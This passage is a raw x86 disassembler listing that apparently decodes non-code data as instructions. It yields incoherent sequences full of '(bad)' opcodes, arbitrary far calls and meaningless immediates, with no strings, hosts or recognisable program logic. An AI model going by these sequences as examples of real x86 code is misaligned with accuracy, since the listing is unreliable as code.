  416fc9:	add    bh,ah
  416fcb:	add    edi,DWORD PTR [ecx]
  416fcd:	add    bh,ah
  416fcf:	add    edi,DWORD PTR [ecx]
  416fd1:	add    bh,ah
  416fd3:	add    edi,DWORD PTR [ecx]
  416fd5:	add    bh,ah
  416fd7:	add    edi,DWORD PTR [ecx]
  416fd9:	add    bh,ah
  416fdb:	add    edi,DWORD PTR [ecx]
  416fdd:	add    bh,ah
  416fdf:	add    edi,DWORD PTR [ecx]
  416fe1:	add    bh,ah
  416fe3:	add    edi,DWORD PTR [ecx]
  416fe5:	add    bh,ah
  416fe7:	add    ebp,DWORD PTR [ecx-0x61de39ce]
  416fed:	and    al,0xc4
  416fef:	xor    al,0x4f
  416ff1:	daa    
  416ff2:	xchg   ebp,eax
  416ff3:	sub    bh,BYTE PTR [ecx]
  416ff5:	push   eax
  416ff6:	cdq    
  416ff7:	sub    BYTE PTR [eax],al
	...
  417009:	add    BYTE PTR [eax],al
  41700b:	add    BYTE PTR [edi+0x391e8327],dl
  417011:	inc    edi
  417012:	call   0x5e2f:0x88249a55
  417019:	test   BYTE PTR cs:[ebx],al
  41701c:	mov    DWORD PTR [edi],ebx
  41701e:	jnp    0x41704b
  417020:	cmp    DWORD PTR [eax-0x78],edx
  417023:	das    
  417024:	push   ecx
  417025:	dec    esp
  417026:	push   esi
  417027:	aas    
  417028:	push   ecx
  417029:	sbb    esp,edi
  41702b:	xor    al,0x56
  41702d:	sbb    eax,0x31572945
  417032:	std    
  417033:	xor    al,0x4e
  417035:	and    al,0x50
  417037:	xor    BYTE PTR [edx],bl
  417039:	add    BYTE PTR [edx],bh
  41703b:	sub    edx,DWORD PTR [esi+eiz*1]
  41703e:	add    BYTE PTR [esi+0x53],al
  417041:	das    
  417042:	cs xor eax,0x1a002c5d
  417048:	bound  ebx,QWORD PTR [ebx]
  41704a:	outs   dx,BYTE PTR ds:[esi]
  41704b:	push   cs
  41704c:	arpl   WORD PTR [edi],bp
  41704e:	xor    al,bh
  417050:	push   esi
  417051:	cmp    BYTE PTR [ecx+ebp*8+0x45],dh
  417055:	sbb    eax,0x26201765
  41705a:	jno    0x417016
  41705c:	pusha  
  41705d:	xor    BYTE PTR [eax-0x3],bh
  417060:	cmp    bl,bh
  417062:	xor    DWORD PTR [edx],ecx
  417064:	xor    eax,0x3acd31df
  417069:	fbstp  TBYTE PTR [ecx]
  41706b:	les    edi,FWORD PTR [edx]
  41706d:	dec    edi
  41706e:	inc    ebx
  41706f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  417084:	pop    es
  417085:	aas    
  417086:	push   esp
  417087:	or     DWORD PTR ds:0x60bd7123,ecx
  41708d:	push   ebx
  41708e:	imul   eax,esp,0x16
  417091:	adc    al,0x63
  417093:	(bad)  
  417094:	pop    ebp
  417095:	cs ja  0x417051
  417098:	dec    esi
  417099:	pop    ds
  41709a:	fs mov esp,0x8f721f4d
  4170a0:	pop    ebx
  4170a1:	daa    
  4170a2:	arpl   bp,ax
  4170a4:	sbb    bl,BYTE PTR [edi]
  4170a6:	outs   dx,BYTE PTR ds:[esi]
  4170a7:	mov    al,BYTE PTR [ebx+ebp*1+0x70]
  4170ab:	jge    0x417104
  4170ad:	sbb    al,0x50
  4170af:	mov    BYTE PTR ds:0x2c867531,ah
  4170b5:	sbb    al,0x20
  4170b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170b8:	test   BYTE PTR [ebp+0x4b],al
  4170bb:	or     DWORD PTR [eax],esp
  4170bd:	and    eax,0x25213e7a
  4170c2:	gs inc eax
  4170c4:	pop    ds
  4170c5:	xor    DWORD PTR [eax],eax
  4170c7:	daa    
  4170c8:	or     al,0x2e
  4170ca:	arpl   WORD PTR [eax],ax
  4170cc:	push   es
  4170cd:	(bad)  [edi+0x0]
  4170d0:	dec    esp
  4170d1:	dec    ecx
  4170d2:	imul   edi,DWORD PTR [edx-0x7],0xffffffe7
  4170d6:	imul   esp,DWORD PTR [ecx+0x2c],0xfffffff2
  4170da:	fs jb  0x417122
  4170dd:	adc    ch,BYTE PTR [ebx+0x78]
  4170e0:	dec    esp
  4170e1:	cld    
  4170e2:	dec    esi
  4170e3:	outs   dx,DWORD PTR ds:[esi]
  4170e4:	ss lock jb 0x417149
	...
  4170fc:	and    ah,cl
  4170fe:	pop    ebx
  4170ff:	dec    ebp
  417100:	dec    edi
  417101:	mul    BYTE PTR [esp+ebp*2+0x3c]
  417105:	(bad)  
  417107:	sub    al,0x7d
  417109:	test   al,0xfd
  41710b:	gs fs out dx,eax
  41710e:	cmp    DWORD PTR [edi],ebp
  417110:	das    
  417111:	cld    
  417112:	addr16 je 0x417179
  417115:	out    dx,eax
  417116:	cmp    DWORD PTR [edi],ebp
  417118:	aas    
  417119:	cld    
  41711a:	addr16 je 0x417181
  41711d:	out    dx,eax
  41711e:	outs   dx,BYTE PTR ds:[esi]
  41711f:	cmp    cl,BYTE PTR [edi-0x65]
  417122:	std    
  417123:	gs in  al,0xee
  417126:	sub    eax,0x71e3f600
  41712b:	gs (bad) 
  41712d:	inc    edx
  41712e:	push   eax
  41712f:	jae    0x4170da
  417131:	loop   0x417193
  417133:	jae    0x417133
  417135:	adc    bl,BYTE PTR [ebp+0x74]
  417138:	adc    BYTE PTR [esi+0x61],cl
  41713b:	popa   
  41713c:	popf   
  41713d:	fldcw  WORD PTR [ebp+0x6b]
  417140:	(bad)
  417143:	pop    ebx
  417144:	popf   
  417145:	fnstcw WORD PTR [ecx+0x69]
  417148:	mov    esp,0xc35c5cda
  41714d:	fistp  WORD PTR [ebp+ecx*2+0x6f]
  417151:	fisub  DWORD PTR [esi+0x65]
  417154:	pop    ecx
  417155:	pop    eax
  417156:	add    BYTE PTR [esi+0x39],al
  417159:	cmp    eax,0xa9526125
  41715e:	push   ebp
  41715f:	inc    esi
	...
  417174:	and    eax,0xd69214a
  417179:	out    0x31,eax
  41717b:	ins    DWORD PTR es:[edi],dx
  41717c:	neg    BYTE PTR cs:[esi]
  41717f:	jb     0x41717e
  417181:	test   al,0x48
  417183:	ins    DWORD PTR es:[edi],dx
  417184:	adc    edx,DWORD PTR [eax]
  417186:	sub    BYTE PTR [eax+ebx*1-0x57],ch
  41718a:	push   ebp
  41718b:	dec    ebx
  41718c:	push   ss
  41718d:	movntps XMMWORD PTR [ebp+ecx*1+0x8],xmm5
  417192:	pop    eax
  417193:	push   eax
  417194:	jmp    0x41719f
  417196:	push   ds
  417197:	addr16 (bad) 
  41719a:	xor    BYTE PTR [ecx+edi*1+0x16],bl
  41719e:	and    eax,0x24a9e566
  4171a3:	jb     0x417181
  4171a5:	mov    esp,0xc5d46345
  4171aa:	sub    DWORD PTR [esi-0x13],eax
  4171ad:	js     0x4171b0
  4171af:	aas    
  4171b0:	leave  
  4171b1:	fdivr  DWORD PTR ds:0x45a7ab67
  4171b7:	ins    DWORD PTR es:[edi],dx
  4171b8:	call   0x175:0x904425c8
  4171bf:	bound  ecx,QWORD PTR [esi-0x6794d58e]
  4171c5:	xchg   ebp,eax
  4171c6:	sub    ch,BYTE PTR [esi]
  4171c8:	xchg   ebp,eax
  4171c9:	mov    BYTE PTR ds:0x2d806a00,ch
  4171cf:	arpl   WORD PTR [eax+0x31],si
  4171d2:	sbb    ebp,DWORD PTR [ebp+0x27]
  4171d5:	cwde   
  4171d6:	cmp    edx,DWORD PTR [eax+0x0]
	...
  4171e9:	add    BYTE PTR [eax],al
  4171eb:	add    BYTE PTR [ecx],bh
  4171ed:	bound  ebx,QWORD PTR ds:0x3ba75767
  4171f3:	pop    edi
  4171f4:	xor    ch,BYTE PTR [bx]
  4171f7:	addr16 dec ebp
  4171f9:	add    BYTE PTR [ecx+esi*1+0x1f],cl
  4171fd:	sbb    al,0x48
  4171ff:	xor    BYTE PTR [ecx],bh
  417201:	dec    ecx
  417202:	inc    eax
  417203:	es ja  0x417252
  417206:	aaa    
  417207:	add    al,0x28
  417209:	daa    
  41720a:	cmp    ebx,DWORD PTR [edi]
  41720c:	sub    dl,ah
  41720e:	inc    edx
  41720f:	and    bh,BYTE PTR [ecx]
  417211:	cmp    eax,0x3bf65123
  417216:	or     edi,DWORD PTR [ecx]
  417218:	out    dx,ax
  41721a:	sub    ebx,esi
  41721c:	cli    
  41721d:	call   0x3f9564f4
  417222:	shr    dh,1
  417224:	clc    
  417225:	loop   0x4171fe
  417227:	repnz (bad) 
  41722a:	sar    ebx,cl
  41722c:	das    
  41722d:	clc    
  41722e:	mov    dh,0xe6
  417230:	push   ss
  417231:	lock scas al,BYTE PTR es:[edi]
  417233:	repz pop ds
  417235:	cmp    al,0x29
  417237:	icebp  
  417238:	or     BYTE PTR [edx],bh
  41723a:	lods   eax,DWORD PTR ds:[esi]
  41723b:	out    dx,eax
  41723c:	rcl    DWORD PTR [ebx-0x50],cl
  41723f:	and    eax,0x20c62de9
  417244:	call   0x9a6f4b63
  417249:	cs cli 
  41724b:	icebp  
  41724c:	cs les esi,FWORD PTR cs:[ecx]
	...
  417264:	scas   eax,DWORD PTR es:[edi]
  417265:	sbb    edi,DWORD PTR [ecx-0x43c7b0d0]
  41726b:	daa    
  41726c:	cmp    DWORD PTR [ebp+ebp*4+0x4f],edx
  417270:	imul   edi,DWORD PTR [ecx],0x1b8d2f84
  417276:	cdq    
  417277:	add    edi,DWORD PTR [edx+0x4d]
  41727a:	mov    bl,0x1f
  41727c:	pop    ebx
  41727d:	out    dx,al
  41727e:	aam    0x1f
  417280:	mov    gs,WORD PTR [edi+eiz*8]
  417283:	push   edx
  417284:	jge    0x4172a5
  417286:	add    BYTE PTR [ebp+0x1b],bh
  417289:	loop   0x4172ee
  41728b:	mov    BYTE PTR [esi],ah
  41728d:	add    BYTE PTR [esp+ebp*1+0x8],bl
  417291:	sub    al,0x71
  417293:	dec    esi
  417294:	daa    
  417295:	sub    al,0x5c
  417297:	sub    BYTE PTR [ecx+0x3a],dh
  41729a:	push   esp
  41729b:	cmp    DWORD PTR ds:0x4e3d6e39,edi
  4172a1:	outs   dx,BYTE PTR cs:[esi]
  4172a3:	inc    esp
  4172a4:	imul   esp,eax,0x24653142
  4172aa:	ins    DWORD PTR es:[edi],dx
  4172ab:	cmp    esi,DWORD PTR [esi]
  4172ad:	add    BYTE PTR cs:[esi],bh
  4172b0:	bound  esp,QWORD PTR [edx]
  4172b2:	addr16 (bad) 
  4172b5:	sub    al,0x41
  4172b7:	or     BYTE PTR [eax+0x28],bl
  4172ba:	arpl   WORD PTR [edx],bp
  4172bc:	sub    ebx,DWORD PTR ds:0x2c170c64
  4172c2:	or     BYTE PTR [bx+di],dl
  4172c5:	das    
  4172c6:	add    BYTE PTR [eax+eax*1],ah
	...
  4172d9:	add    BYTE PTR [eax],al
  4172db:	add    BYTE PTR [eax],cl
  4172dd:	loopne 0x417325
  4172df:	and    al,0x5d
  4172e1:	cmp    dl,BYTE PTR [ecx+edi*4+0x5a]
  4172e5:	inc    eax
  4172e6:	pop    edi
  4172e7:	fimul  DWORD PTR [ecx]
  4172e9:	sub    ebp,DWORD PTR [ebp-0x25]
  4172ec:	push   ds
  4172ed:	das    
  4172ee:	add    BYTE PTR [ebp-0x4fb01076],ah
  4172f4:	xor    BYTE PTR [eax],dl
  4172f6:	add    BYTE PTR [ecx-0x4492cb97],bh
  4172fc:	aas    
  4172fd:	and    DWORD PTR [esi],ebp
  4172ff:	lds    ebx,FWORD PTR [esi+0x1c]
  417302:	add    BYTE PTR [ecx-0x6492cb97],bh
  417308:	daa    
  417309:	inc    ecx
  41730a:	jb     0x417298
  41730c:	pop    ebx
  41730d:	xor    al,0x63
  41730f:	mov    al,ds:0x74311c
  417314:	shl    ebp,0x5e
  417317:	rol    BYTE PTR gs:[ebx],1
  41731a:	pop    edi
  41731b:	jb     0x417386
  41731d:	repz jae 0x417353
  417320:	xchg   edx,eax
  417321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417322:	popa   
  417323:	ins    BYTE PTR es:[edi],dx
  417324:	fs add al,0x3f
  417327:	jb     0x417382
  417329:	hlt    
  41732a:	jae    0x417381
  41732c:	jbe    0x417322
  41732e:	jno    0x41739f
  417330:	or     al,0xd9
  417332:	pop    esi
  417333:	je     0x417391
  417335:	in     eax,0x73
  417337:	popa   
  417338:	nop
  417339:	add    eax,DWORD PTR [eax]
  41733b:	add    BYTE PTR [eax+0x3],dl
	...
  417351:	add    BYTE PTR [eax],al
  417353:	add    BYTE PTR [eax+0x4a400003],ah
  417359:	stos   DWORD PTR es:[edi],eax
  41735a:	cmp    esp,esp
  41735c:	sbb    al,bl
  41735e:	or     eax,0xaa0425bf
  417363:	add    BYTE PTR [ecx],bh
  417365:	cmp    ch,dh
  417367:	inc    ecx
  417368:	sub    ch,BYTE PTR [ebx-0x3d051bc7]
  41736e:	or     eax,0xaa0365bf
  417373:	add    BYTE PTR [ecx],bh
  417375:	cmp    ch,dh
  417377:	inc    edx
  417378:	mov    ch,BYTE PTR [edx-0x3c651bc7]
  41737e:	or     eax,0xaa0365bf
  417383:	add    cl,bh
  417385:	cmp    dh,ch
  417387:	aas    
  417388:	and    BYTE PTR [ebx],al
  41738a:	add    BYTE PTR ds:0x55b520,ah
  417390:	ret    
  417391:	loope  0x4173f8
  417393:	je     0x417364
  417395:	jecxz  0x417408
  417397:	gs hlt 
  417399:	aas    
  41739a:	arpl   WORD PTR gs:[edx+0x396f6ee1],sp
  4173a1:	jg     0x4173d8
  4173a3:	pop    esp
  4173a4:	sub    BYTE PTR [edi],0x35
  4173a7:	arpl   WORD PTR [ebx-0x69],bp
  4173aa:	sub    BYTE PTR [ecx+ebx*1+0x64],dh
  4173ae:	sub    DWORD PTR [eax+0x4d],esi
  4173b1:	xchg   BYTE PTR [ebx],dh
  4173b3:	arpl   WORD PTR [ebx+0x7d],cx
  4173b6:	cmp    al,0x6e
	...
  4173cc:	inc    ebp
  4173cd:	cmp    al,0x20
  4173cf:	ins    BYTE PTR es:[edi],dx
  4173d0:	push   eax
  4173d1:	out    0x20,eax
  4173d3:	jb     0x417421
  4173d5:	dec    edx
  4173d6:	push   eax
  4173d7:	push   ecx
  4173d8:	sub    eax,0x165f35ee
  4173dd:	cmp    al,0xf6
  4173df:	jmp    DWORD PTR [esi+0x18000198]
  4173e5:	cdq    
  4173e6:	and    eax,DWORD PTR [eax]
  4173e8:	sbb    al,0x99
  4173ea:	repz inc DWORD PTR [esi-0x67]
  4173ee:	idiv   edi
  4173f0:	inc    ecx
  4173f1:	cdq    
  4173f2:	daa    
  4173f3:	add    BYTE PTR [ecx+ebx*4-0x14],cl
  4173f7:	(bad)  
  4173f8:	fcomp  DWORD PTR [eax-0x66d8000b]
  4173fe:	loopne 0x4173ff
  417400:	sub    bl,BYTE PTR [ecx-0x672affda]
  417406:	in     al,dx
  417407:	jmp    DWORD PTR ds:0xa002499
  41740d:	cdq    
  41740e:	clc    
  41740f:	dec    DWORD PTR [esi]
  417411:	cdq    
  417412:	loopne 0x417413
  417414:	fistp  DWORD PTR [eax-0x6897000d]
  41741a:	in     al,dx
  41741b:	call   FWORD PTR [esi-0x69]
  41741e:	cmc    
  41741f:	call   FWORD PTR [edx-0x67ffdc69]
  417425:	xchg   edi,eax
  417426:	cli    
  417427:	call   FWORD PTR [edi+edx*4+0x10efffa]
  41742e:	out    0x40,eax
	...
  417444:	sahf   
  417445:	and    DWORD PTR [ecx-0x72e277de],ebx
  41744b:	aaa    
  41744c:	xchg   esp,eax
  41744d:	push   ebp
  41744e:	and    BYTE PTR [ecx],0x76
  417451:	push   ds
  417452:	mov    WORD PTR [edi],?
  417454:	test   dl,bl
  417456:	out    0x29,al
  417458:	xor    BYTE PTR gs:[ecx-0x65ffda1e],dh
  41745f:	and    dl,BYTE PTR [edi+0x34]
  417462:	pop    esi
  417463:	and    ecx,DWORD PTR [ebx+0x23]
  417466:	cmp    eax,DWORD PTR [ebx+0x55]
  417469:	sbb    eax,0x41152749
  41746e:	ds pop ds
  417470:	and    bl,BYTE PTR ds:0x17080455
  417476:	xor    esp,DWORD PTR [edi]
  417478:	or     BYTE PTR [ebx],ah
  41747a:	cmp    DWORD PTR [edx],edi
  41747c:	sbb    dh,BYTE PTR [edx]
  41747e:	cmp    al,BYTE PTR [eax+ebp*8]
  417481:	push   ss
  417482:	sbb    esp,DWORD PTR [edi]
  417484:	call   0x1a7b8dab
  417489:	xor    al,bh
  41748b:	out    0xda,al
  41748d:	dec    ebx
  41748e:	pop    ds
  41748f:	and    eax,ebp
  417491:	xor    esp,edi
  417493:	push   esp
  417494:	fidiv  WORD PTR [ebx]
  417496:	add    al,0x55
  417498:	fidiv  DWORD PTR [ecx]
  41749a:	std    
  41749b:	es retf 
  41749d:	ffreep st(3)
  41749f:	daa    
  4174a0:	in     eax,dx
  4174a1:	push   esp
  4174a2:	int3   
  4174a3:	and    eax,0x3cb31ea
	...
  4174bc:	call   0x88684fd7
  4174c1:	and    ebx,ecx
  4174c3:	cmp    DWORD PTR [edx-0x6518f8ce],ebx
  4174c9:	dec    esp
  4174ca:	cdq    
  4174cb:	es xchg edx,eax
  4174cd:	sbb    eax,0xe05fbd00
  4174d2:	inc    ebx
  4174d3:	rol    BYTE PTR [ecx+eiz*1+0x61],0x9d
  4174d8:	pop    ecx
  4174d9:	xor    dh,BYTE PTR [edi-0x17]
  4174dc:	gs and eax,0x218d8c74
  4174e2:	jb     0x41747b
  4174e4:	pop    ss
  4174e5:	xor    ah,BYTE PTR [eax]
  4174e7:	int3   
  4174e8:	push   ds
  4174e9:	fst    DWORD PTR [edx+0x7a]
  4174ec:	pop    ss
  4174ed:	xor    al,BYTE PTR [eax]
  4174ef:	call   0x3217:0x9a633433
  4174f6:	jbe    0x417544
  4174f8:	pavgb  mm4,QWORD PTR [edx]
  4174fb:	inc    ebp
  4174fc:	ficom  WORD PTR [ecx+0x71]
  4174ff:	dec    esp
  417500:	outs   dx,DWORD PTR ds:[esi]
  417501:	loopne 0x417552
  417503:	ss xor eax,0x642570e1
  417509:	and    DWORD PTR [edi+0x4a],esi
  41750c:	cmp    eax,0x3d47674d
  417511:	dec    edi
  417512:	addr16 xor eax,0x1b634f56
  417518:	inc    ebx
  417519:	and    DWORD PTR [edx-0x37],esi
  41751c:	xchg   edi,eax
  41751d:	and    BYTE PTR [edx+edi*1+0x0],bl
	...
  417531:	add    BYTE PTR [eax],al
  417533:	add    BYTE PTR [ebx],al
  417535:	push   esp
  417536:	push   eax
  417537:	jmp    0xfcad9632
  41753c:	adc    ah,BYTE PTR [ecx]
  41753e:	inc    esi
  41753f:	adc    eax,0x710005
  417544:	adc    DWORD PTR [ecx],esp
  417546:	jno    0x417507
  417548:	and    bl,BYTE PTR [ecx]
  41754a:	ins    BYTE PTR es:[edi],dx
  41754b:	jmp    0x9a39631
  417550:	icebp  
  417551:	dec    esp
  417552:	je     0x41751c
  417554:	cmp    bh,BYTE PTR [ebp*2+0x201a53c6]
  41755b:	add    ah,dl
  41755d:	fidiv  WORD PTR [ebx+0x61]
  417560:	adc    BYTE PTR [ebp+0x4d],dl
  417563:	dec    esp
  417564:	stc    
  417565:	repz pusha 
  417567:	and    dh,dh
  417569:	loopne 0x4175dc
  41756b:	ins    DWORD PTR es:[edi],dx
  41756c:	mov    cl,0xf3
  41756e:	pop    ds
  41756f:	xor    edx,DWORD PTR [eax]
  417571:	hlt    
  417572:	pop    esp
  417573:	bound  edi,QWORD PTR [edx+eiz*8-0x391fd801]
  41757a:	std    
  41757b:	pop    ds
  41757c:	rol    BYTE PTR [ebx+ecx*2+0x4e],1
  417580:	ret    
  417581:	push   ebx
  417582:	push   edx
  417583:	inc    ecx
  417584:	cdq    
  417585:	inc    ecx
  417586:	push   esp
  417587:	add    BYTE PTR [eax+0x114d4555],dh
  41758d:	dec    esi
  41758e:	push   ebp
  41758f:	add    BYTE PTR ds:0x755144ea,al
  417595:	cmp    DWORD PTR [eax],eax
  417597:	inc    ebx
	...
  4175ac:	pop    eax
  4175ad:	cmp    DWORD PTR [edi],edi
  4175af:	dec    ebx
  4175b0:	nop
  4175b1:	inc    ebp
  4175b2:	dec    ebx
  4175b3:	push   edx
  4175b4:	push   ebp
  4175b5:	in     eax,dx
  4175b6:	inc    edx
  4175b7:	dec    esi
  4175b8:	mov    al,ds:0xf76f6bff
  4175bd:	or     al,0x6e
  4175bf:	jae    0x417551
  4175c1:	or     dh,BYTE PTR [edx+0x69]
  4175c4:	aaa    
  4175c5:	or     eax,0xee555f6e
  4175ca:	imul   eax,DWORD PTR [eax],0x50
  4175cd:	in     eax,0x6e
  4175cf:	jae    0x417638
  4175d1:	or     dh,BYTE PTR [edx+0x64]
  4175d4:	aas    
  4175d5:	repnz pop esp
  4175d7:	ins    BYTE PTR es:[edi],dx
  4175d8:	push   ebp
  4175d9:	fdivr  st,st(7)
  4175db:	je     0x417630
  4175dd:	fdiv   DWORD PTR [ecx+0x6e]
  4175e0:	jno    0x4175c2
  4175e2:	pusha  
  4175e3:	pop    edi
  4175e4:	data16 in al,0x6b
  4175e7:	jne    0x417622
  4175e9:	mov    esp,0xc9a56601
  4175ee:	out    0x2c,eax
  4175f0:	push   esi
  4175f1:	cdq    
  4175f2:	sbb    DWORD PTR [ebp+eiz*4+0x69],esi
  4175f6:	out    0x2c,eax
  4175f8:	cwd    
  4175fa:	sbb    DWORD PTR [ebp+eax*4+0x69],esi
  4175fe:	xor    bh,BYTE PTR [edx]
  417600:	push   esi
  417601:	rol    BYTE PTR [ecx],cl
  417603:	pop    esp
  417604:	jbe    0x417680
  417606:	push   ds
  417607:	gs gs jl 0x417658
  41760b:	inc    ecx
  41760c:	popa   
  41760d:	xchg   DWORD PTR [esi],ebx
  41760f:	imul   eax,DWORD PTR [eax],0x0
	...
  417622:	add    BYTE PTR [eax],al
  417624:	pop    esp
  417625:	cdq    
  417626:	dec    ebp
  417627:	inc    ecx
  417628:	push   ecx
  417629:	daa    
  41762a:	push   ds
  41762b:	imul   esp,DWORD PTR [eax+0x2c],0x20
  41762f:	add    BYTE PTR [ebp+0x56],ch
  417632:	sbb    DWORD PTR [edx+0x56],esi
  417635:	push   esp
  417636:	daa    
  417637:	push   eax
  417638:	dec    ebp
  417639:	push   esp
  41763a:	xor    DWORD PTR [eax],eax
  41763c:	or     al,BYTE PTR [edx+0x26]
  41763f:	je     0x417667
  417641:	cmp    BYTE PTR [edx],dh
  417643:	arpl   WORD PTR ds:0xe721bd6,ax
  417649:	cmp    al,0x27
  41764b:	push   eax
  41764c:	and    eax,0x30ec
  417651:	jmp    0x417683
  417653:	je     0x41766d
  417655:	adc    eax,0xff55d20
  41765a:	xor    al,BYTE PTR [eax]
  41765c:	adc    eax,0xdc6d31d7
  417661:	push   DWORD PTR [esi]
  417663:	imul   edi,DWORD PTR [ecx],0xffffffe5
  417666:	cmp    eax,0x3210da67
  41766b:	ins    DWORD PTR es:[edi],dx
  41766c:	in     al,0xfb
  41766e:	add    ebx,DWORD PTR [edx+edi*8-0x57]
  417672:	and    BYTE PTR [ebp-0x23],ch
  417675:	call   ebp
  417677:	add    ebx,ebp
  417679:	dec    ebp
  41767a:	into   
  41767b:	and    ah,BYTE PTR [eax-0x5ae033c5]
  417681:	add    BYTE PTR [edx-0x2cdc8c20],ah
  417687:	sub    BYTE PTR [eax],al
	...
  417699:	add    BYTE PTR [eax],al
  41769b:	add    BYTE PTR [edx+ebx*1-0x247fb019],cl
  4176a2:	mov    ds:0xbe239d28,eax
  4176a7:	sbb    eax,0x31b74c39
  4176ac:	mov    WORD PTR [edx],fs
  4176ae:	nop
  4176af:	pop    ds
  4176b0:	pop    edx
  4176b1:	sub    eax,0x176948e7
  4176b6:	mov    al,BYTE PTR [ebx]
  4176b8:	test   DWORD PTR [ebx+0x77],eax
  4176bb:	sbb    al,0x58
  4176bd:	dec    esp
  4176be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176bf:	xor    ebx,DWORD PTR [esi+0x1d]
  4176c2:	out    0x52,eax
  4176c4:	inc    ebp
  4176c5:	pop    ds
  4176c6:	test   DWORD PTR ds:0x543b4212,esp
  4176cc:	cmp    DWORD PTR ds:0x2d1a3850,ebp
  4176d2:	add    eax,0xe7171f1b
  4176d7:	dec    edi
  4176d8:	or     BYTE PTR [edi],dl
  4176da:	cmp    esp,DWORD PTR [edi]
  4176dc:	sub    BYTE PTR [eax],al
  4176de:	sbb    edx,DWORD PTR [esi+0x1e]
  4176e1:	sub    eax,0x1b1c2140
  4176e6:	pop    es
  4176e7:	aas    
  4176e8:	sbb    ah,BYTE PTR [eax+edx*1]
  4176eb:	and    edi,DWORD PTR [ecx]
  4176ed:	fiadd  DWORD PTR [eax+edi*1]
  4176f0:	jmp    0xda45b0f4
  4176f5:	call   DWORD PTR [edx]
  4176f7:	add    al,0xed
  4176f9:	dec    DWORD PTR [edi]
  4176fb:	add    al,0xcf
  4176fd:	inc    DWORD PTR ds:0x4
	...
  417713:	add    al,cl
  417715:	(bad)  
  417716:	(bad)  
  417717:	call   0xfd86c356
  41771c:	and    eax,0x5ad55f1e
  417721:	cmp    eax,0x1c54d66d
  417726:	ins    DWORD PTR es:[edi],dx
  417727:	enter  0x1d56,0x72
  41772b:	jmp    0xc86facb9
  417730:	push   0x7ce9681f
  417735:	arpl   WORD PTR cs:[edx-0x66abbdce],di
  41773c:	cmp    bl,dl
  41773e:	push   eax
  41773f:	mov    ah,0x74
  417741:	add    BYTE PTR [edx-0x73],al
  417744:	sbb    esp,DWORD PTR [esi]
  417746:	arpl   WORD PTR [edi-0x65ffcfda],bp
  41774c:	inc    ebx
  41774d:	xor    al,0x63
  41774f:	xlat   BYTE PTR ds:[ebx]
  417750:	push   ss
  417751:	dec    ecx
  417752:	je     0x41773d
  417754:	push   ss
  417755:	dec    ecx
  417756:	jno    0x4177d5
  417758:	push   0x49
  41775a:	jno    0x4177d6
  41775c:	or     eax,0x354d721b
  417761:	cmp    al,0x5f
  417763:	pop    edx
  417764:	jno    0x41774f
  417766:	arpl   WORD PTR [ebp+0x6b],cx
  417769:	sbb    eax,0x3c3d5a71
  41776e:	pop    edi
  41776f:	cmp    ah,BYTE PTR [ecx+0x4d]
  417772:	jno    0x4177b8
  417774:	dec    ebx
  417775:	add    BYTE PTR [eax+ecx*2+0x0],cl
	...
  417789:	add    BYTE PTR [eax],al
  41778b:	add    BYTE PTR [eax+0x34],cl
  41778e:	push   eax
  41778f:	ds dec ebx
  417791:	xor    al,0x0
  417793:	cmp    bl,BYTE PTR [edx+eiz*1]
  417796:	je     0x4177ae
  417798:	sbb    ch,BYTE PTR [esi]
  41779a:	arpl   WORD PTR ds:0x1a5f1bf7,si
  4177a0:	inc    ebp
  4177a1:	push   eax
  4177a2:	arpl   WORD PTR [eax],ax
  4177a4:	xor    DWORD PTR [edi],eax
  4177a6:	pop    esp
  4177a7:	inc    edx
  4177a8:	inc    esp
  4177a9:	fnstsw WORD PTR [ecx+0x65]
  4177ac:	push   ds
  4177ad:	call   0xe164d421
  4177b2:	jae    0x417828
  4177b4:	imul   ecx,DWORD PTR [edx],0x38207363
  4177ba:	inc    edx
  4177bb:	ins    BYTE PTR es:[edi],dx
  4177bc:	add    edx,ebx
  4177be:	pusha  
  4177bf:	inc    esi
  4177c0:	or     al,0xf4
  4177c2:	jmp    FWORD PTR ds:0x6bf3ee
  4177c8:	fimul  WORD PTR [edi+0x50]
  4177cb:	sub    edi,DWORD PTR [ebx]
  4177cd:	(bad)  
  4177ce:	dec    ecx
  4177cf:	imul   eax,esi,0xa8735c08
  4177d5:	fisubr WORD PTR [ebx+0x6c]
  4177d8:	mov    ah,0x4
  4177da:	jo     0x417841
  4177dc:	mov    dh,0x37
  4177de:	pop    edi
  4177df:	outs   dx,DWORD PTR ds:[esi]
  4177e0:	gs push es
  4177e2:	pop    ebp
  4177e3:	outs   dx,BYTE PTR ds:[esi]
  4177e4:	lods   al,BYTE PTR ds:[esi]
  4177e5:	add    eax,DWORD PTR [ebx+0x6f]
  4177e8:	sahf   
  4177e9:	dec    edi
  4177ea:	push   eax
  4177eb:	add    BYTE PTR [ebx+0x6e6e04],ah
	...
  417801:	add    BYTE PTR [eax],al
  417803:	add    BYTE PTR [ebp+0x676973e0],bh
  417809:	or     ch,BYTE PTR [edi+0x2e]
  41780c:	or     al,0xd4
  41780e:	jae    0x417810
  417810:	push   ebx
  417811:	inc    eax
  417812:	sub    DWORD PTR [esi+0x6c],eax
  417815:	dec    esp
  417816:	add    BYTE PTR [ebx+0x9],dh
  417819:	lock pusha 
  41781b:	jae    0x417863
  41781d:	add    eax,0x3fa0696e
  417822:	das    
  417823:	inc    esp
  417824:	test   DWORD PTR [ecx+0x54],eax
  417827:	push   eax
  417828:	nop
  417829:	aas    
  41782a:	dec    edi
  41782b:	imul   ecx,DWORD PTR [ecx+eiz*8+0x43],0x1b0a3965
  417833:	xlat   BYTE PTR gs:[ebx]
  417835:	sti    
  417836:	xor    eax,0x41ee0a00
  41783b:	push   esp
  41783c:	out    dx,al
  41783d:	xlat   BYTE PTR ds:[ebx]
  41783e:	push   ebp
  41783f:	inc    ebx
  417840:	in     eax,dx
  417841:	fst    DWORD PTR [edi]
  417843:	pop    edi
  417844:	retf   0x20a9
  417847:	jno    0x417826
  417849:	fs sub al,0x70
  41784c:	pushf  
  41784d:	push   ebp
  41784e:	sbb    al,0x62
  417850:	(bad)  
  417851:	sar    BYTE PTR [edi],cl
  417853:	aaa    
  417854:	imul   ecx,DWORD PTR ds:0x16140f5,0x5f4f45d7
  41785e:	repz sub cl,BYTE PTR [eax-0x57]
  417862:	hlt    
  417863:	ds push esp
  417865:	pop    eax
  417866:	test   BYTE PTR [eax+0x0],0x0
	...
  41787a:	add    BYTE PTR [eax],al
